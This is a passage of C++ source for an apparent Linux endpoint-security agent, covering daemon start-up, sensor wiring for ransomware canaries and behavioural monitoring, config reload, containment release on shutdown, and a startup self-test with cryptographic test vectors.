// SPDX-License-Identifier: Apache-2.0
// HyprNova :: Agent implementation

#include "agent/agent.hpp"

#include "core/brand.hpp"

#include <algorithm>
#include <csignal>
#include <cstdlib>
#include <cstring>
#include <format>
#include <filesystem>
#include <fstream>
#include <functional>
#include <mutex>

namespace fs = std::filesystem;
#include <signal.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <thread>
#include <sys/wait.h>
#include <unistd.h>

#include "anti_ransomware/canary.hpp"
#include "anti_ransomware/honeypot.hpp"
#include "anti_ransomware/file_monitor.hpp"
#include "behavioral/audit_sensor.hpp"
#include "behavioral/proc_poll.hpp"
#include "behavioral/falco_sensor.hpp"
#include "behavioral/osquery_sensor.hpp"
#include "core/exec.hpp"
#include "core/fd.hpp"
#include "core/hash.hpp"
#include "core/log.hpp"
#include "core/proc.hpp"
#include "gui/gui_bridge.hpp"
#include "hardening/boot_auditor.hpp"
#include "hardening/kernel_hardening.hpp"
#include "hardening/sshd_audit.hpp"
#include "forensics/mem_inspect.hpp"
#include "hardening/mac_profile.hpp"
#include "scanning/scan_bridge.hpp"
#include "scanning/scanner.hpp"

namespace hyprnova {

namespace fsx = core::fsx;
using namespace std::chrono_literals;

namespace {

constexpr std::string_view kVersion = "1.0.0";

/// The single agent instance the signal handlers point at. Signal handlers cannot
/// capture, and there is exactly one daemon per host, so a file-scope pointer is
/// the correct design here rather than a convenience.
std::atomic<Agent*> g_agent{nullptr};
std::atomic<int> g_pending_signal{0};

void signal_trampoline(int sig) noexcept {
    // Async-signal-safe: no locks, no allocation, no logging, no formatting.
    // Record the signal and let the main loop notice.
    g_pending_signal.store(sig, std::memory_order_release);
    Agent* a = g_agent.load(std::memory_order_acquire);
    if (a != nullptr) a->request_stop();
}

[[nodiscard]] std::string proc_self(std::string_view what) noexcept {
    return fsx::read_trimmed("/proc/self/" + std::string(what));
}

/// Configure logging from the config. Called on start and on every reload, so a
/// log-level change takes effect without restarting detection.
void configure_logging(const core::AgentConfig& cfg) noexcept {
    static core::Logger logger(8192);
    static std::once_flag once;
    std::call_once(once, [] { core::set_global_logger(&logger); });

    core::logger().set_level(cfg.log_level);
    core::logger().clear_sinks();
    if (cfg.log_to_stderr) core::logger().add_sink(std::make_shared<core::StdioSink>(::isatty(2) != 0));
    if (!cfg.log_path.empty())
        core::logger().add_sink(std::make_shared<core::FileSink>(cfg.log_path, cfg.log_max_bytes));
}

}  // namespace

void install_agent_signal_hook(Agent* a) noexcept { g_agent.store(a, std::memory_order_release); }

// ---------------------------------------------------------------------------
// Lifecycle
// ---------------------------------------------------------------------------

Agent::Agent()
    : bus_(core::AgentConfig{}.bus_ring_depth),
      pool_(core::ThreadPoolConfig{std::max<std::size_t>(2, std::thread::hardware_concurrency()),
                                   4096, "hyprnova-pool"}),
      sensors_(bus_, cfg_, pool_) {}

Agent::~Agent() {
    stop();
    install_agent_signal_hook(nullptr);
}

bool Agent::init(std::string_view config_path) {
    config_path_ = std::string(config_path);

    if (config_path_.empty() || config_path_ == "-") {
        cfg_ = core::default_config();
    } else if (auto loaded = core::load_config(config_path_)) {
        cfg_ = std::move(*loaded);
    } else {
        // Log to stderr for this one message: the configured sink may not exist yet.
        core::logger().set_level(core::LogLevel::Info);
        core::logger().add_sink(std::make_shared<core::StdioSink>(true));
        std::vector<core::ConfigError> errs;
        (void)core::load_config(config_path_, &errs);
        for (const auto& e : errs)
            SERROR("agent", "config error [{}]: {}", e.path, e.message);
        SERROR("agent", "FATAL: cannot load {}", config_path_);
        return false;
    }
    configure_logging(cfg_);

    // Runtime directories first: the logger, the GUI socket, the quarantine and the
    // scan batch lists all need somewhere to live.
    for (const auto& d : {cfg_.run_dir, cfg_.state_dir}) {
        if (!fsx::mkdir_p(d, 0750)) {
            // A developer running unprivileged still gets a functional agent with
            // logging to stderr; the affected sensors will report themselves
            // degraded rather than the daemon refusing to start.
            SWARN("agent", "cannot create {} ({}): continuing, some features will be unavailable", d,
                  std::strerror(errno));
        }
    }
    // A world-writable state directory would let any local user pre-plant a
    // baseline or a canary key, which is a detection bypass rather than a nuisance.
    if (fsx::is_dir(cfg_.state_dir)) (void)fsx::set_mode(cfg_.state_dir, 0750);

    SINFO("agent", "{} (hyprnova core) v{} starting (pid {}, euid {}, config {})",
          std::string_view(core::kProductName), kVersion, ::getpid(),
          ::geteuid(), config_path_.empty() ? "<built-in defaults>" : config_path_);

    if (::geteuid() != 0) {
        SWARN("agent", "running as euid {} not 0: fanotify permission events, auditd netlink, cgroup "
                       "containment and nftables will all be unavailable. Detection runs in a reduced "
                       "mode and every affected sensor reports itself degraded.",
              ::geteuid());
    }
    if (cfg_.dry_run) {
        SWARN("agent", "dry_run is ENABLED: no process will be signalled, no file quarantined, no "
                       "firewall rule installed. Findings are recorded and reported only.");
    }
    if (core::exec::inside_container()) {
        SINFO("agent", "running inside a container: boot audit, kernel hardening and MAC profile "
                       "describe the HOST namespace and will be marked degraded");
    }

    install_agent_signal_hook(this);
    install_signal_handlers();

    // Remediation is constructed before the sensors so the escalation backend is
    // wired before the first event could possibly need it.
    remediation_ = std::make_shared<remediation::RemediationEngine>(bus_, cfg_);
    shadow_ = std::make_unique<remediation::ShadowCopyEngine>(cfg_);
    toolbox_ = std::make_unique<tools::Toolbox>(cfg_.integrations);
    rescue_ = std::make_unique<remediation::RescueBoot>(cfg_.rescue);
    ai_ = std::make_unique<ai::AiAnalyst>(cfg_.ai);
    shredder_ = std::make_unique<remediation::Shredder>(cfg_);
    mem_ = std::make_unique<forensics::MemInspector>(cfg_);
    remediation_->probe_capabilities();

    heuristics_ = std::make_shared<heuristics::HeuristicSensor>(bus_, cfg_, pool_);
    heuristics_->set_backend(remediation_);

    build_sensors();

    // The escalation backend needs a SignatureEngine, which the scanner sensor
    // owns. Wiring therefore happens after build_sensors(), and the bridge borrows
    // the engine by reference: the sensor outlives the bridge because both are
    // owned by this Agent and destroyed in the reverse of construction order.
    // The sensor's identity is StaticWatch; BatchScan is the id it stamps on the
    // events a KVRT/clamd batch produces. Looking the sensor up by BatchScan here
    // returned null, which silently disabled escalation steps 2-3.
    if (auto* scanner = sensor<scanning::ScannerSensor>(core::SensorId::StaticWatch)) {
        remediation_->set_scanner(std::make_shared<scanning::ScannerBridge>(scanner->engine()));
        if (auto* pp = sensor<behavioral::ProcPollSensor>(core::SensorId::ProcessPoll))
            pp->set_scanner(scanner);
        if (mem_) mem_->set_engine(&scanner->engine());
        // The Toolbox's combined profiles scan with the same engine (Module 8b).
        if (toolbox_) toolbox_->set_internal_scanner(std::make_shared<scanning::ScannerBridge>(scanner->engine()));
        SINFO("agent", "escalation steps 2-3 wired to the signature engine ({} rules, {} patterns)",
              scanner->engine().rule_count(), scanner->engine().pattern_count());
    } else {
        SWARN("agent", "scanner sensor disabled: escalation step 2 (memory signature match) and step 3 "
                       "(lineage batch scan) will report no evidence");
    }

    gui_ = std::make_unique<GuiBridge>(*this, bus_, cfg_);

    if (cfg_.self_test_on_start) {
        const auto st = self_test();
        for (const auto& c : st.checks) SINFO("agent", "self-test: {}", c);
        for (const auto& f : st.fatal) SERROR("agent", "self-test FATAL: {}", f);
        if (!st.passed) {
            SERROR("agent", "self-test failed: refusing to start an agent that cannot be trusted to "
                            "report accurately");
            core::TelemetryEvent ev;
            ev.sensor = core::SensorId::Agent;
            ev.kind = core::EventKind::SensorDown;
            ev.severity = core::Severity::Critical;
            ev.message = "startup self-test FAILED: " + (st.fatal.empty() ? std::string("?") : st.fatal.front());
            static_cast<void>(bus_.publish(std::move(ev)));
            return false;
        }
        SINFO("agent", "startup self-test passed ({} checks)", st.checks.size());
    }
    return true;
}

void Agent::build_sensors() noexcept {
    // Insertion order is dependency order. Module 1 first, because its findings
    // explain Module 4's: "auditd is disabled" is a hardening result, not a
    // behavioural one.
    if (cfg_.boot.enabled) sensors_.add(std::make_unique<hardening::BootAuditSensor>(bus_, cfg_, pool_));
    if (cfg_.hardening.enabled)
        sensors_.add(std::make_unique<hardening::KernelHardeningSensor>(bus_, cfg_, pool_));
    if (cfg_.mac.enabled) sensors_.add(std::make_unique<hardening::MacProfileSensor>(bus_, cfg_, pool_));

    // Module 2: canaries before the file monitor, which holds a pointer to them.
    anti_ransomware::CanarySensor* canary_ptr = nullptr;
    if (cfg_.canary.enabled) {
        auto canaries = std::make_unique<anti_ransomware::CanarySensor>(bus_, cfg_, pool_);
        canary_ptr = canaries.get();
        sensors_.add(std::move(canaries));
        // Ransomware protection is the product's headline guarantee: if the
        // canaries cannot be planted, the agent must not report itself healthy.
        sensors_.mark_critical("canary");
    }
    if (cfg_.ransomware.enabled)
        sensors_.add(std::make_unique<anti_ransomware::FileMonitorSensor>(bus_, cfg_, pool_, canary_ptr));

    // Module 2c: honeypot decoy configs. Lives inside our own state dir, so it
    // is safe by construction; still operator-toggleable.
    if (cfg_.canary.enabled && cfg_.canary.honeypots_enabled)
        sensors_.add(std::make_unique<anti_ransomware::HoneypotSensor>(bus_, cfg_, pool_));

    // Module 3.
    if (cfg_.scan.enabled) sensors_.add(std::make_unique<scanning::ScannerSensor>(bus_, cfg_, pool_));

    // Module 4. Each of these tolerates its producer being absent: a missing
    // falco.sock or a stopped auditd degrades one sensor, never the daemon.
    if (cfg_.falco.enabled) sensors_.add(std::make_unique<behavioral::FalcoSensor>(bus_, cfg_, pool_));
    if (cfg_.suricata.enabled)
        sensors_.add(std::make_unique<behavioral::SuricataSensor>(bus_, cfg_, pool_));
    if (cfg_.auditd.enabled) sensors_.add(std::make_unique<behavioral::AuditSensor>(bus_, cfg_, pool_));
    if (cfg_.osquery.enabled) sensors_.add(std::make_unique<behavioral::OsquerySensor>(bus_, cfg_, pool_));

    // Module 4b: unprivileged exec visibility. Needs no capabilities, so it is
    // the attribution source that keeps response working for a userspace
    // install. Wired to the scanner AFTER registration (both live in sensors_).
    if (cfg_.proc_poll.enabled)
        sensors_.add(std::make_unique<behavioral::ProcPollSensor>(bus_, cfg_, pool_));

    // Module 5 last: it consumes everyone else's output, so it must be subscribed
    // only once the producers exist.
    if (cfg_.heuristic.enabled) sensors_.add_shared(heuristics_);
}

void Agent::install_signal_handlers() noexcept {
    struct sigaction sa {};
    sa.sa_handler = signal_trampoline;
    // SA_RESTART so a SIGTERM arriving during a blocking read does not surface as
    // EINTR inside a sensor. Deliberately NOT SA_RESETHAND: SIGHUP must remain
    // handled across repeated reloads.
    sa.sa_flags = SA_RESTART;
    sigemptyset(&sa.sa_mask);
    for (const int sig : {SIGTERM, SIGINT, SIGHUP}) {
        if (::sigaction(sig, &sa, nullptr) != 0)
            SWARN("agent", "sigaction({}) failed: {}", sig, std::strerror(errno));
    }
    // SIGPIPE must be ignored process-wide: writing to a GUI socket that just
    // closed would otherwise terminate the daemon outright.
    struct sigaction ign {};
    ign.sa_handler = SIG_IGN;
    sigemptyset(&ign.sa_mask);
    (void)::sigaction(SIGPIPE, &ign, nullptr);
}

bool Agent::start() {
    if (running_.load()) return true;

    bus_.start();

    // The policy subscriber turns findings into containment; the agent subscriber
    // keeps the operator-visible lifecycle record. Both run on the bus dispatcher
    // thread, so neither may block: they only call remediation methods that are
    // themselves quick or internally pool-dispatched.
    policy_sub_id_ =
        bus_.subscribe("policy", [this](const core::TelemetryEvent& ev) { enforce_policy(ev); });
    sub_id_ = bus_.subscribe("agent", [this](const core::TelemetryEvent& ev) { on_event(ev); });

    if (!sensors_.start_all()) {
        SERROR("agent", "a critical sensor failed to start; see the log for which one");
        stop();
        return false;
    }

    if (cfg_.gui.enabled && gui_) {
        gui_->allow_uid(::getuid());
        if (!gui_->start()) {
            SWARN("agent", "GUI bridge failed to start on {}: the daemon continues headless ({})",
                  gui_->path(), gui_->last_error());
        } else {
            gui_->prime_history(cfg_.gui.event_feed_max);
            SINFO("agent", "GUI bridge listening on {}", gui_->path());
        }
    }

    exe_escalation_.emplace(cfg_.remediation.exe_block_after_endpoints);

    running_.store(true, std::memory_order_release);
    started_at_ = core::SysClock::now();

    // Shadow copy at EVERY start: this is the "a shadow copy every restart"
    // guarantee. Run on the pool so a large state tree never delays start-up;
    // retention prunes inside take(). Failure is logged, never fatal: recovery
    // being one snapshot stale beats the agent refusing to start.
    if (cfg_.shadow.enabled && shadow_) {
        (void)pool_.submit([this] {
            std::string d;
            const std::string id = shadow_->take("agent start", d);
            if (id.empty()) SWARN("agent", "startup shadow copy failed: {}", d);
        }, "shadow-snapshot");
    }

    // Ecosystem probe on the pool: ~80 stat() calls and trusted-path lookups,
    // never on the hot path. The console reads the matrix whenever it wants;
    // a missing tool is a reported fact, not an error.
    if (cfg_.integrations.enabled && toolbox_) {
        (void)pool_.submit([this] { toolbox_->probe(); }, "toolbox-probe");
    }

    // A finished rescue-environment run left its report in the real root; turn
    // it into findings now, on the first normal boot after the rescue scan.
    // Nothing here is fatal: an unreadable report is logged and kept for the
    // operator rather than deleting evidence.
    if (toolbox_) {
        (void)pool_.submit([this] {
            // The rescue run writes into the REAL root (/var/lib/hyprnova);
            // sandboxed/test installs use $state_dir. Try state_dir first,
            // then the canonical real-root path when it is readable.
            std::string rp = cfg_.state_dir + "/rescue-report.json";
            if (!fs::is_regular_file(fs::path{rp})) {
                const std::string alt = "/var/lib/hyprnova/rescue-report.json";
                std::error_code ec;
                if (alt != rp && fs::is_regular_file(fs::path{alt}, ec)) rp = alt;
            }
            const auto rep = tools::Toolbox::parse_rescue_report(rp);
            if (!rep) return;
            // Schema honesty: a report without finished_epoch is malformed
            // (truncated write? forged?). Keep it for the operator, say so,
            // and never consume evidence we could not fully read.
            if (rep->at("finished_epoch") == nullptr) {
                SWARN("agent",
                      "rescue report at {} is malformed (no finished_epoch); "
                      "kept unconsumed for inspection",
                      rp);
                return;
            }
            const auto finished = rep->integer("finished_epoch", 0);
            const auto count = rep->integer("finding_count", 0);
            SINFO("agent", "rescue-environment report found (epoch {}, {} finding(s))",
                  finished, count);
            // One event per finding (capped): they land in history and the GUI
            // timeline instead of hiding inside a single summary line.
            constexpr std::size_t kMaxFindingEvents = 50;
            if (const auto* arr = rep->at("findings") ? rep->at("findings")->as_array()
                                                      : nullptr) {
                std::size_t n = 0;
                for (const auto& f : *arr) {
                    if (n >= kMaxFindingEvents) break;
                    const std::string line(f.as_string_copy());
                    if (line.empty()) continue;
                    core::TelemetryEvent fev;
                    fev.sensor = core::SensorId::Agent;
                    fev.kind = core::EventKind::ToolFinding;
                    fev.severity = core::Severity::High;
                    fev.message = "rescue finding: " + line;
                    static_cast<void>(bus_.publish(std::move(fev)));
                    ++n;
                }
                if (arr->size() > kMaxFindingEvents)
                    SINFO("agent",
                          "rescue report has {} findings; first {} published as events, "
                          "the rest are in the report file",
                          arr->size(), kMaxFindingEvents);
            } else if (count > 0) {
                // Older report format (count only): point at the findings file.
                SWARN("agent",
                      "rescue report has finding_count={} but no findings array "
                      "(older cleaner script); read {} for the details",
                      count, "/var/lib/hyprnova/rescue-findings.txt");
            }
            core::TelemetryEvent ev;
            ev.sensor = core::SensorId::Agent;
            ev.kind = core::EventKind::ToolFinding;
            ev.severity = count > 0 ? core::Severity::High : core::Severity::Info;
            ev.message = std::format(
                "rescue scan finished: {} finding(s) -- run `hyprnova-cli rescue-status`",
                count);
            static_cast<void>(bus_.publish(std::move(ev)));
            std::error_code ec;
            fs::rename(fs::path{rp}, fs::path{rp + ".consumed"}, ec);
            if (ec)
                SWARN("agent", "could not mark rescue report consumed ({}): it will be "
                               "re-ingested on the next start",
                      ec.message());
        }, "rescue-report-ingest");
    }

    core::TelemetryEvent ev;
    ev.sensor = core::SensorId::Agent;
    ev.kind = core::EventKind::SensorUp;
    ev.severity = core::Severity::Info;
    ev.message = std::format("{} v{} started: pid {} euid {} sensors={} degraded={} "
                             "dry_run={} auto_respond={}",
                             std::string_view(core::kProductName), kVersion, ::getpid(), ::geteuid(),
                             sensors_.count(), sensors_.degraded_count(), cfg_.dry_run ? "YES" : "no",
                             cfg_.heuristic.auto_respond ? "YES" : "no");
    ev.fields["version"] = std::string(kVersion);
    ev.fields["config"] = config_path_;
    ev.fields["container"] = core::exec::inside_container() ? "yes" : "no";
    ev.fields["capabilities"] =
        std::format("signal={} cgroup={} network={} quarantine={} notify={}",
                    remediation_->capabilities().can_signal, remediation_->capabilities().can_cgroup,
                    remediation_->capabilities().can_nftables,
                    remediation_->capabilities().can_quarantine,
                    remediation_->capabilities().can_notify);
    static_cast<void>(bus_.publish(std::move(ev)));

    // Capability gaps are published as events, not just logged: an operator
    // looking at the dashboard must see that network blocking is unavailable
    // *before* the incident that would have needed it.
    for (const auto& n : remediation_->capabilities().notes) {
        core::TelemetryEvent note;
        note.sensor = core::SensorId::Remediation;
        note.kind = core::EventKind::SensorDown;
        note.severity = core::Severity::Medium;
        note.message = "capability gap: " + n;
        note.triggers.push_back("capability_gap");
        static_cast<void>(bus_.publish(std::move(note)));
    }
    return true;
}

void Agent::run() {
    if (!running_.load()) return;

    auto last_heartbeat = core::SteadyClock::now();
    auto last_expire = core::SteadyClock::now();

    while (!stopping_.load(std::memory_order_acquire)) {
        std::this_thread::sleep_for(200ms);

        const int sig = g_pending_signal.exchange(0, std::memory_order_acq_rel);
        if (sig == SIGHUP) {
            // SIGHUP means reload, not exit. The handler set the stop flag because
            // it cannot know which signal it was, so clear it and keep running.
            stopping_.store(false, std::memory_order_release);
            SINFO("agent", "SIGHUP received: reloading configuration");
            (void)reload_config("SIGHUP");
            last_heartbeat = core::SteadyClock::now();
            continue;
        }
        if (sig == SIGTERM || sig == SIGINT) {
            SINFO("agent", "signal {} received: shutting down", sig);
            break;
        }

        if (core::SteadyClock::now() - last_heartbeat >= cfg_.heartbeat_interval) {
            heartbeat();
            last_heartbeat = core::SteadyClock::now();
        }
        if (core::SteadyClock::now() - last_expire >= 60s) {
            // TTL expiry is what makes a network block self-healing: without this
            // tick a false positive would persist until someone noticed.
            remediation_->expire_blocks();
            last_expire = core::SteadyClock::now();
        }
    }
    stop();
}

void Agent::request_stop() noexcept { stopping_.store(true, std::memory_order_release); }

void Agent::stop() noexcept {
    const bool was_running = running_.exchange(false, std::memory_order_acq_rel);
    if (stopping_.exchange(true) && !was_running) return;  // already fully stopped
    if (!was_running && sensors_.count() == 0) return;

    SINFO("agent", "shutdown: stopping sensors first so no new findings are produced");

    // 1. Sensors stop producing.
    sensors_.stop_all();

    // 2. Disconnect the GUI. The bridge sends a goodbye frame to each client
    //    before closing, so an operator sees *why* the console went dark instead
    //    of watching a frozen dashboard.
    if (gui_) gui_->stop();

    // 3. Undo every reversible action. This is the step that makes an
    //    auto-responding EDR safe to deploy: a crash, a package upgrade or an
    //    operator's Ctrl-C must never leave the host with frozen processes and a
    //    firewall nobody remembers configuring.
    SINFO("agent", "shutdown: releasing containment ({} suspended pid(s), {} active block(s))",
          remediation_->suspended_pids().size(), remediation_->active_blocks().size());
    remediation_->resume_all();

    // 4. Take the policy subscriber off before the bus stops, so no in-flight
    //    event can trigger new remediation while we are tearing down.
    if (policy_sub_id_ != 0) {
        bus_.unsubscribe(policy_sub_id_);
        policy_sub_id_ = 0;
    }
    if (sub_id_ != 0) {
        bus_.unsubscribe(sub_id_);
        sub_id_ = 0;
    }

    // 5. Drain the bus so queued events reach the log and the journal.
    bus_.stop();

    const auto st = stats();
    core::TelemetryEvent ev;
    ev.sensor = core::SensorId::Agent;
    ev.kind = core::EventKind::SensorDown;
    ev.severity = core::Severity::Info;
    ev.message = std::format("hyprnova stopped after {}s: {} published, {} dispatched, {} dropped, "
                             "{} policy actions",
                             st.uptime_seconds, st.events_published, st.events_dispatched,
                             st.events_dropped, policy_actions_.load(std::memory_order_relaxed));
    static_cast<void>(bus_.publish(std::move(ev)));

    // 6. Join the pool last: remediation work items may still be running.
    pool_.shutdown();

    SINFO("agent", "shutdown complete: published={} dispatched={} dropped={} policy_actions={}",
          st.events_published, st.events_dispatched, st.events_dropped,
          policy_actions_.load(std::memory_order_relaxed));
    core::logger().flush();
    install_agent_signal_hook(nullptr);
}

bool Agent::reload_config(std::string_view why) noexcept {
    if (config_path_.empty()) {
        SWARN("agent", "reload requested ({}) but no config file was loaded; nothing to reload", why);
        return false;
    }
    std::vector<core::ConfigError> errs;
    auto loaded = core::load_config(config_path_, &errs);
    if (!loaded) {
        for (const auto& e : errs) SERROR("agent", "reload error [{}]: {}", e.path, e.message);
        SERROR("agent", "reload FAILED ({}): keeping the previous configuration", why);
        core::TelemetryEvent ev;
        ev.sensor = core::SensorId::Agent;
        ev.kind = core::EventKind::ConfigReload;
        ev.severity = core::Severity::High;
        ev.message = std::format("configuration reload FAILED ({}): previous configuration retained", why);
        ev.fields["reason"] = std::string(why);
        for (const auto& e : errs) ev.triggers.push_back(e.path + ": " + e.message);
        static_cast<void>(bus_.publish(std::move(ev)));
        return false;
    }

    // Pause sensors, swap, restart. Mutating the config object that every sensor
    // holds a const reference to while their threads are reading it would be a
    // data race, so the swap happens with the producers stopped. That costs a few
    // seconds of coverage, which is the right trade for a race-free reload; a
    // zero-gap reload needs RCU-style versioned config snapshots.
    SINFO("agent", "reload ({}): pausing {} sensors for a race-free config swap", why, sensors_.count());
    sensors_.stop_all();

    const bool dry_run_changed = loaded->dry_run != cfg_.dry_run;
    const bool auto_respond_changed = loaded->heuristic.auto_respond != cfg_.heuristic.auto_respond;
    cfg_ = std::move(*loaded);
    configure_logging(cfg_);
    remediation_->probe_capabilities();
    sensors_.reload_all(cfg_);
    const bool ok = sensors_.start_all();

    core::TelemetryEvent ev;
    ev.sensor = core::SensorId::Agent;
    ev.kind = core::EventKind::ConfigReload;
    ev.severity = ok ? core::Severity::Info : core::Severity::High;
    ev.message = std::format("configuration reloaded ({}) from {}: sensors={} degraded={} dry_run={} "
                             "auto_respond={}",
                             why, config_path_, sensors_.count(), sensors_.degraded_count(),
                             cfg_.dry_run ? "YES" : "no", cfg_.heuristic.auto_respond ? "YES" : "no");
    ev.fields["reason"] = std::string(why);
    if (dry_run_changed) ev.triggers.push_back("dry_run_changed");
    if (auto_respond_changed) ev.triggers.push_back("auto_respond_changed");
    static_cast<void>(bus_.publish(std::move(ev)));
    return ok;
}

// ---------------------------------------------------------------------------
// Self-test
// ---------------------------------------------------------------------------

Agent::SelfTestResult Agent::self_test() noexcept {
    SelfTestResult r;
    auto check = [&](std::string_view what, bool ok, std::string_view detail = {}) {
        r.checks.push_back(std::string(ok ? "ok: " : "FAIL: ") + std::string(what) +
                           (detail.empty() ? std::string() : " -- " + std::string(detail)));
        if (!ok) r.fatal.emplace_back(std::string(what) + ": " + std::string(detail));
    };
    // A check that cannot run here is reported, never failed: `hyprnovad
    // --self-test` has to be usable by an unprivileged developer and by CI, and a
    // red result caused by "you are not root" trains operators to ignore red.
    auto skip = [&](std::string_view what, std::string_view why) {
        r.checks.push_back("SKIP: " + std::string(what) + " -- " + std::string(why));
    };

    // 1. Crypto must be correct. Everything downstream trusts these digests: a
    //    broken SHA-256 means broken canary MACs, a broken verdict cache and
    //    broken quarantine integrity.
    {
        const std::string hex = core::hash::Sha256::to_hex(core::hash::Sha256::once("abc"));
        check("sha256(\"abc\") matches the FIPS 180-4 test vector",
              hex == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad", hex);
    }
    {
        const std::string_view key = "Jefe";
        const std::string_view msg = "what do ya want for nothing?";
        const auto as_bytes = [](std::string_view sv) {
            return core::hash::Bytes{reinterpret_cast<const std::byte*>(sv.data()), sv.size()};
        };
        const auto mac = core::hash::hmac_sha256(as_bytes(key), as_bytes(msg));
        const std::string hex = core::hash::Sha256::to_hex(mac);
        check("hmac-sha256 matches RFC 4231 test case 2",
              hex == "5bdcc146bf60754e6a042426089575c75a003f089d2739839dec58b964ec3843", hex);
    }

    // 2. Entropy must discriminate. This single number is the whole ransomware
    //    signal, so it is worth a startup assertion.
    {
        std::vector<std::byte> flat(4096, std::byte{'A'});
        std::vector<std::byte> varied(4096);
        for (std::size_t i = 0; i < varied.size(); ++i) varied[i] = static_cast<std::byte>(i & 0xFFU);
        const double h_flat = core::hash::shannon_entropy(flat);
        const double h_varied = core::hash::shannon_entropy(varied);
        check("shannon_entropy(constant buffer) == 0.0", h_flat < 0.001, std::format("{:.4f}", h_flat));
        check("shannon_entropy(byte rotation) == 8.0", h_varied > 7.999,
              std::format("{:.4f}", h_varied));
    }

    // 3. The lock-free rings must not lose or reorder items. A silent drop here
    //    means events never reach the GUI and never trigger policy.
    {
        core::SpscRing<int> ring{1024};
        std::size_t outstanding = 0;
        for (int i = 0; i < 4096; ++i) {
            if (ring.try_push(i)) ++outstanding;
            while (ring.try_pop().has_value()) --outstanding;
        }
        check("SpscRing loses nothing under push/pop churn", outstanding == 0,
              std::format("{} outstanding", outstanding));

        // The consumer must run CONCURRENTLY with the producers. A bounded ring
        // whose producers spin on try_push() deadlocks if the only consumer is
        // joined afterwards -- which is exactly the bug this test would otherwise
        // ship with.
        core::MpscRing<int> mp{1024};
        constexpr int kProducers = 4;
        constexpr int kPerProducer = 2000;
        std::atomic<int> consumed{0};
        std::atomic<bool> consumer_done{false};
        std::jthread consumer([&] {
            while (consumed.load(std::memory_order_relaxed) < kProducers * kPerProducer) {
                if (mp.try_pop().has_value()) consumed.fetch_add(1, std::memory_order_relaxed);
                else std::this_thread::yield();
            }
            consumer_done.store(true, std::memory_order_release);
        });
        std::vector<std::jthread> producers;
        producers.reserve(kProducers);
        for (int t = 0; t < kProducers; ++t) {
            producers.emplace_back([&mp] {
                for (int i = 0; i < kPerProducer; ++i) {
                    while (!mp.try_push(i)) std::this_thread::yield();
                }
            });
        }
        producers.clear();   // joins every producer
        const auto deadline = core::SteadyClock::now() + 10s;
        while (!consumer_done.load(std::memory_order_acquire) && core::SteadyClock::now() < deadline)
            std::this_thread::sleep_for(1ms);
        if (consumer.joinable()) consumer.request_stop();
        check("MpscRing survives 4 concurrent producers on a bounded ring",
              consumed.load() == kProducers * kPerProducer,
              std::format("consumed {}/{}", consumed.load(), kProducers * kPerProducer));
    }

    // 4. The bus must deliver.
    {
        std::atomic<int> seen{0};
        const auto id = bus_.subscribe("selftest",
                                       [&](const core::TelemetryEvent&) {
                                           seen.fetch_add(1, std::memory_order_relaxed);
                                       });
        bus_.start();
        for (int i = 0; i < 8; ++i) {
            core::TelemetryEvent ev;
            ev.sensor = core::SensorId::Agent;
            ev.kind = core::EventKind::Heartbeat;
            ev.message = "self-test";
            static_cast<void>(bus_.publish(std::move(ev)));
        }
        const auto deadline = core::SteadyClock::now() + 2s;
        while (seen.load() < 8 && core::SteadyClock::now() < deadline) std::this_thread::sleep_for(5ms);
        bus_.unsubscribe(id);
        bus_.stop();
        check("EventBus delivers published events to a subscriber", seen.load() >= 8,
              std::format("delivered {}/8", seen.load()));
    }

    // 5. /proc must be readable. Without it there is no attribution and every
    //    alert degrades to "something happened, we do not know what".
    check("/proc/self/status readable", !proc_self("status").empty());
    check("/proc/self/maps readable", !proc_self("maps").empty());
    {
        const auto pi = core::proc::read(::getpid());
        check("ProcessInfo enriches own pid (exe, comm, uid)",
              pi.exists && !pi.exe.empty() && !pi.comm.empty() && pi.uid == ::getuid(),
              std::format("exe={} comm={} uid={}", pi.exe, pi.comm, pi.uid));
        check("process ancestry resolves", !core::proc::ancestry(::getpid()).empty());
        check("memory map parsing yields regions", !core::proc::maps(::getpid(), 64).empty());
    }

    if (::geteuid() != 0) {
        skip("privileged containment paths (fanotify PERM, netlink audit, cgroup, nftables)",
             "requires euid 0; run the self-test as root to cover them");
    }

    // 6. The subprocess layer must work -- and must refuse untrusted binaries,
    //    because it runs as root.
    {
        const auto truebin = core::exec::find_in_system_path("true");
        if (truebin.empty()) {
            check("core::exec locates /bin/true in the trusted search path", false, "not found");
        } else {
            const auto res = core::exec::run(truebin, {});
            check("core::exec spawns and reaps a child", res.spawned && res.exit_code == 0, res.error);
        }
        const auto echo = core::exec::find_in_system_path("echo");
        if (!echo.empty()) {
            const auto cap = core::exec::capture(echo, {"hyprnova-selftest"});
            check("core::exec captures stdout",
                  cap.has_value() && cap->find("hyprnova-selftest") != std::string::npos,
                  cap.value_or("<no output>"));
        }
        core::exec::Options fast;
        fast.timeout = 200ms;
        const auto sleeper = core::exec::find_in_system_path("sleep");
        if (!sleeper.empty()) {
            const auto to = core::exec::run(sleeper, {"30"}, fast);
            check("core::exec enforces its timeout and kills the group",
                  to.timed_out || !to.spawned,
                  std::format("spawned={} timed_out={} exit={}", to.spawned, to.timed_out, to.exit_code));
        }
    }

    // 7. JSON round-trip: the GUI protocol, the Falco/EVE parsers, the auditd
    //    correlator and the action journal all depend on it.
    {
        core::json::ParseError pe {};
        const auto doc = core::json::parse(R"({"a":{"b":[1,2,"x"]},"n":null,"f":1.5})", {}, &pe);
        check("json parses nested objects and arrays", doc.has_value() && doc->is_object(), pe.message);
        if (doc) {
            check("json dotted accessor indexes into arrays (a.b.2)",
                  doc->str("a.b.2") == "x", doc->str("a.b.2"));
            check("json dotted accessor returns null past the end of an array",
                  doc->at("a.b.9") == nullptr);
            check("json dotted accessor reads nested objects (a.b.0)",
                  doc->integer("a.b.0") == 1, std::to_string(doc->integer("a.b.0")));
            check("json round-trips through dump()", core::json::parse(doc->dump()).has_value());
        }
        core::json::ParseError bad {};
        check("json rejects malformed input rather than guessing",
              !core::json::parse(R"({"a":)", {}, &bad).has_value(), bad.message);
    }

    // 8. Atomic file writes: canaries, quarantine metadata and the baseline all
    //    rely on a crash never leaving a truncated artefact.
    {
        // Prefer the configured run dir; fall back to /tmp so the check still
        // exercises write_atomic when the daemon is not running as root.
        std::string dir = cfg_.run_dir;
        if (!fsx::is_dir(dir) || ::access(dir.c_str(), W_OK) != 0) {
            dir = "/tmp";
            skip("fsx checks in " + cfg_.run_dir,
